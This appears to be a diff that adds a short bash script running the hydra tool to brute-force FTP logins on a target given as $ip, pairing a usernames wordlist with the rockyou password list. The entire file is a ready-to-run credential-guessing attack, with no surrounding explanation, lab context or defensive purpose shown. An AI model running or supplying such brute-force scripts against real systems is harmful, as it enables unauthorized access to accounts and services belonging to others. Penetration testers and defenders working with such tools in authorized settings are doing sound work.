@@ -1,0 +1,3 @@
+#!/bin/bash
+
+sudo hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt ftp://$ip
